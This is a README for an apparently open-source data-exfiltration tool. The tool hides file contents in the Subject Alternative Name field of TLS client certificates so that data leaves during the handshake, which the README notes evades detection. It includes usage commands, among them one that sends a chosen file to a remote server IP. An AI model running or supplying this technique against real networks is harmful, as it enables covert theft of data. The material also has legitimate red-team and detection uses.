# ex-509
> Data exfiltration abusing x509 certificates

In most TLS connections, typically only the identity of the server is verified through certificates.
However, the TLS protocol allows for mutual authentication of both the client and server during the handshake.
This exfiltration technique stores payload data in the Subject Alternative Name (SAN) field of the client certificate,
and transfers the data back to the attacker's machine during the TLS handshake itself.
This makes the exfiltration harder to detect, since the transfer happens before the actual TLS session is established.

## Requirements
Python >= 3.4


Use the package manager [pip](https://pip.pypa.io/en/stable/) to install the required libraries.

* On both the client and server machines, [pyOpenSSL](https://www.pyopenssl.org/en/stable/install.html) is required for certificate generation and parsing:

* On the server machine, [tlslite-ng](https://pypi.org/project/tlslite-ng/) is required for more control over the TLS handshake:

## Usage

### Server
Start listening for connections:
```sh
python3 ex-509.py
```

To specify a custom certificate, private key, or port number:
```sh
python3 ex-509.py --cert [PATH TO CERT] --key [PATH TO KEY] --port [PORT]
```

*If no certificate is specified, one will be generated and used automatically*

### Client
Sending a file to the server:
```sh
python3 client.py -f [PATH TO FILE] -i [SERVER IP] -p [PORT]
```
